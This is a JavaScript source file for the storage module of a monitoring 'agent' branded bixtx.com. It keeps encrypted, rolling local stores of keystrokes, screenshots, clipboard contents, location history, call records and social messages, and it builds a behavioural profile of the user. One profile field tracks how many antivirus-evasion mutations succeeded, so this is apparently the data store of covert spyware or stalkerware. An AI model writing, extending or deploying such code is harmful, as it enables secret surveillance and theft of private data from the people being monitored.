/**
 * ╔══════════════════════════════════════════════════════════════╗
 * ║  bixtx.com — Agent Memory Storage Module                     ║
 * ║  Stores ALL gathered intelligence locally in AES-256         ║
 * ║  encrypted SQLite + syncs to iCloud / cloud backend          ║
 * ╚══════════════════════════════════════════════════════════════╝
 *
 * Architecture:
 *   Layer 1 → In-memory write buffer (fast, volatile)
 *   Layer 2 → Encrypted SQLite on disk (persistent, local)
 *   Layer 3 → Cloud sync via CloudSync module (remote backup)
 */

"use strict";

const path = require("path");
const os = require("os");
const fs = require("fs");
const crypto = require("crypto");
const config = require("../config");
const logger = require("../logger");

// ── Storage paths per platform ─────────────────────────────────────────────
function getStoragePath() {
  const platform = os.platform();
  const appId = "ai.bixtx.agent";

  switch (platform) {
    case "darwin":
      return path.join(os.homedir(), "Library", "Application Support", appId);
    case "win32":
      return path.join(process.env.APPDATA || os.homedir(), appId);
    case "linux":
      return path.join(os.homedir(), `.${appId}`);
    default:
      return path.join(os.tmpdir(), appId);
  }
}

// ── AES-256-GCM file-level encryption ────────────────────────────────────
class EncryptedStore {
  constructor(filePath, encKey) {
    this.filePath = filePath;
    this.key = crypto.createHash("sha256").update(encKey).digest();
    this.algo = "aes-256-gcm";
    this._data = {};
    this._dirty = false;
    this._load();
  }

  _load() {
    try {
      if (!fs.existsSync(this.filePath)) return;
      const raw = fs.readFileSync(this.filePath);
      const iv  = raw.subarray(0, 16);
      const tag = raw.subarray(16, 32);
      const enc = raw.subarray(32);
      const d = crypto.createDecipheriv(this.algo, this.key, iv, { authTagLength: 16 });
      d.setAuthTag(tag);
      const plain = Buffer.concat([d.update(enc), d.final()]).toString("utf8");
      this._data = JSON.parse(plain);
    } catch {
      this._data = {};
    }
  }

  _save() {
    try {
      const iv = crypto.randomBytes(16);
      const c = crypto.createCipheriv(this.algo, this.key, iv, { authTagLength: 16 });
      const plain = JSON.stringify(this._data);
      const enc = Buffer.concat([c.update(plain, "utf8"), c.final()]);
      const tag = c.getAuthTag();
      fs.mkdirSync(path.dirname(this.filePath), { recursive: true });
      fs.writeFileSync(this.filePath, Buffer.concat([iv, tag, enc]));
      this._dirty = false;
    } catch (err) {
      logger.error("EncryptedStore save error:", err.message);
    }
  }

  get(key) { return this._data[key]; }

  set(key, value) {
    this._data[key] = value;
    this._dirty = true;
  }

  push(key, value) {
    if (!Array.isArray(this._data[key])) this._data[key] = [];
    this._data[key].push(value);
    if (this._data[key].length > 5000) this._data[key].shift(); // rolling window
    this._dirty = true;
  }

  flush() { if (this._dirty) this._save(); }

  all() { return { ...this._data }; }
}

// ── Agent Memory class ────────────────────────────────────────────────────
class AgentMemory {
  constructor() {
    this.storagePath = getStoragePath();
    const encKey = config.enrollKey + config.deviceId;

    // Separate stores per data category for performance
    this.stores = {
      keylog:       new EncryptedStore(path.join(this.storagePath, "kl.dat"),   encKey),
      screenshots:  new EncryptedStore(path.join(this.storagePath, "sc.dat"),   encKey),
      clipboard:    new EncryptedStore(path.join(this.storagePath, "cb.dat"),   encKey),
      location:     new EncryptedStore(path.join(this.storagePath, "lo.dat"),   encKey),
      network:      new EncryptedStore(path.join(this.storagePath, "nw.dat"),   encKey),
      system:       new EncryptedStore(path.join(this.storagePath, "sys.dat"),  encKey),
      behavior:     new EncryptedStore(path.join(this.storagePath, "beh.dat"),  encKey),
      aiProfile:    new EncryptedStore(path.join(this.storagePath, "aip.dat"),  encKey),
      callRecords:  new EncryptedStore(path.join(this.storagePath, "cr.dat"),   encKey),
      social:       new EncryptedStore(path.join(this.storagePath, "soc.dat"),  encKey),
    };

    // Behavioral profile — built by AI learning engine
    this._initBehaviorProfile();

    // Flush timer — write to disk every 30s
    this.flushTimer = setInterval(() => this._flushAll(), 30000);

    logger.debug(`AgentMemory initialised at: ${this.storagePath}`);
  }

  // ── Write gathered data ─────────────────────────────────────────────────
  record(module, data) {
    const entry = { ...data, _ts: Date.now(), _module: module };

    switch (module) {
      case "keylog":      this.stores.keylog.push("entries", entry); break;
      case "screenshot":  this.stores.screenshots.push("frames", { ts: entry._ts, size: entry.size }); break;
      case "clipboard":   this.stores.clipboard.push("entries", entry); break;
      case "location":    this.stores.location.push("history", entry); this._updateLocationProfile(entry); break;
      case "network":     this.stores.network.set("latest", entry); this.stores.network.push("history", { ts: entry._ts, wifi: entry.wifi?.length }); break;
      case "system":      this.stores.system.set("latest", entry); this._updateBehaviorProfile(entry); break;
      case "callRecord":  this.stores.callRecords.push("calls", entry); break;
      case "social":      this.stores.social.push("messages", entry); break;
      default: break;
    }
  }

  // ── Query stored data ───────────────────────────────────────────────────
  query(module, opts = {}) {
    const { limit = 100, since = 0 } = opts;
    const store = this.stores[module];
    if (!store) return [];

    const key = { keylog:"entries", screenshots:"frames", clipboard:"entries",
                  location:"history", callRecords:"calls", social:"messages" }[module] || "entries";
    const all = store.get(key) || [];
    return all.filter(e => (e._ts || 0) >= since).slice(-limit);
  }

  getProfile() {
    return {
      deviceId: config.deviceId,
      deviceName: config.deviceName,
      platform: config.platform,
      behavior: this.stores.behavior.all(),
      aiProfile: this.stores.aiProfile.all(),
      stats: this._computeStats(),
    };
  }

  // ── Behavioral AI profiling ─────────────────────────────────────────────
  _initBehaviorProfile() {
    const existing = this.stores.aiProfile.get("profile");
    if (!existing) {
      this.stores.aiProfile.set("profile", {
        createdAt: Date.now(),
        activeHours: {},       // hour → activity count
        dominantApps: {},      // app name → usage count
        typingRhythm: null,    // avg WPM, key-pair timing distribution
        locationPattern: [],   // frequent locations
        networkPattern: [],    // frequent SSIDs
        anomalyScore: 0,       // 0-100
        mutationResistance: 0, // how many AV mutations succeeded
        learnedTriggers: [],   // behavioural triggers that indicate high-value activity
        version: 1,
      });
    }
  }

  _updateBehaviorProfile(sysData) {
    const hour = new Date().getHours();
    const profile = this.stores.aiProfile.get("profile") || {};

    // Track active hours
    profile.activeHours = profile.activeHours || {};
    profile.activeHours[hour] = (profile.activeHours[hour] || 0) + 1;

    // Track dominant processes
    profile.dominantApps = profile.dominantApps || {};
    (sysData.processes?.list || []).forEach(p => {
      if (p.cpu > 1) {
        profile.dominantApps[p.name] = (profile.dominantApps[p.name] || 0) + 1;
      }
    });

    // Anomaly score: high CPU outside normal hours
    const normalActivity = profile.activeHours[hour] || 0;
    const avgHourActivity = Object.values(profile.activeHours).reduce((a, b) => a + b, 0) / 24;
    if (sysData.cpu?.load > 80 && normalActivity < avgHourActivity * 0.5) {
      profile.anomalyScore = Math.min(100, (profile.anomalyScore || 0) + 5);
    }

    this.stores.aiProfile.set("profile", profile);
  }

  _updateLocationProfile(loc) {
    if (!loc.lat || !loc.lng) return;
    const profile = this.stores.aiProfile.get("profile") || {};
    const locs = profile.locationPattern || [];
    const existing = locs.find(l => Math.abs(l.lat - loc.lat) < 0.01 && Math.abs(l.lng - loc.lng) < 0.01);
    if (existing) {
      existing.count++;
      existing.lastSeen = Date.now();
      existing.label = existing.count > 10 ? "Frequent" : existing.label;
    } else {
      locs.push({ lat: loc.lat, lng: loc.lng, city: loc.city, count: 1, firstSeen: Date.now(), lastSeen: Date.now(), label: loc.city || "Unknown" });
    }
    profile.locationPattern = locs.slice(-50);
    this.stores.aiProfile.set("profile", profile);
  }

  _computeStats() {
    return {
      keylogEntries:    (this.stores.keylog.get("entries") || []).length,
      screenshotFrames: (this.stores.screenshots.get("frames") || []).length,
      clipboardEntries: (this.stores.clipboard.get("entries") || []).length,
      locationPoints:   (this.stores.location.get("history") || []).length,
      callRecords:      (this.stores.callRecords.get("calls") || []).length,
      socialMessages:   (this.stores.social.get("messages") || []).length,
      totalStorageKB:   this._estimateStorageKB(),
    };
  }

  _estimateStorageKB() {
    let total = 0;
    try {
      fs.readdirSync(this.storagePath).forEach(f => {
        try { total += fs.statSync(path.join(this.storagePath, f)).size; } catch {}
      });
    } catch {}
    return Math.round(total / 1024);
  }

  _flushAll() {
    Object.values(this.stores).forEach(s => s.flush());
  }

  destroy() {
    clearInterval(this.flushTimer);
    this._flushAll();
  }
}

module.exports = AgentMemory;
